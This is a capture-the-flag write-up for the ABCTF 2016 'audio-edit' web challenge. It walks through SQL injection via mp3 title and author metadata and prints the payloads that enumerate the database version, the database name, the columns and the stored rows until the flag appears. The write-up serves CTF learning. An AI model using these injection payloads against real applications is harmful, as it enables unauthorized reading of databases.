# ABCTF 2016 : audio-edit-200

**Category:** Web
**Points:** 200
**Solves:** 21
**Description:**

I made a cool site to edit audio files. [Can you exploit it?](http://107.170.122.6/audioedit/)

## Write-up

The site offers user to upload an mp3 and therewith do some modifications.
In order to save the uploaded file it's inserted into a database and when
requested it shows 'Author', 'Title' and the filename.
The latter is created as the sha1sum of the mp3 content.

Some test quickly revealed the input of 'Author' and 'Title' in the mp3-metadate aren't verified
and offer a SQL-injection vulnerability.

We figured the insertion statement looked smth. like this:
    INSERT INTO audioedit (..., foo, bla, ...) VALUES (..., 'author','title'...);

In order to an SQL-injection we have to create a special author and title field.
I used easyTAG but you can use whatever you like;-)
In order to do an injection and maintain a valid INSERTION statement you can create an mp3
with the following metadata:
  * title  = "" (leer)
  * author = a', (SELECT @@version))-- -b


Which creates the following statement
    INSERT INTO audioedit (..., foo, bla, ...) VALUES (..., 'a', (SELECT @@version))-- -b',''...);

The 'a' in the beginng and the 'b' in the end where necessary because first an last character where
discarded... why so ever...

This gave us the database version: 5.5.49-0ubuntu0.14.04.1

Next we wanted to know the database name:
  * author = a', (SELECT database()))-- -b:
    audioedit

And of course the column names:
  * author = a',(SELECT column_name FROM information_schema.columns WHERE table_name = 'audioedit' LIMIT x,1))-- -a
  * with x in range(0,3):
    id
    file
    author
    title

So finally we wanted see whats in there:
    * author = a',(SELECT author FROM audioedit.audioedit LIMIT 0,1))-- -a

... but it gaves us an insertion error!:(

The problem is you can't select from a database you inserting at the same time... Thanks to Arxenix!:)

So we got around that using AS:
    * author = a',(SELECT author FROM audioedit.audioedit as blub LIMIT 0,1))-- -a:
    ABCTF
    * author = a',(SELECT title FROM audioedit.audioedit as blub LIMIT 0,1))-- -a:
    flag
    * author = a',(SELECT file FROM audioedit.audioedit as blub LIMIT 0,1))-- -a:
    supersecretflagf1le.mp3

And visited the corresponding site: http://107.170.122.6/audioedit/edit.php?file=supersecretflagf1le.mp3
    
Setting the visualisation to 'Sonogram' finally showed the flag:
    ABCTF{m3t4_inj3cti00n}



## Other write-ups and resources

* http://countersite.org/articles/web-vulnerability/105-audioedit-writeup.html
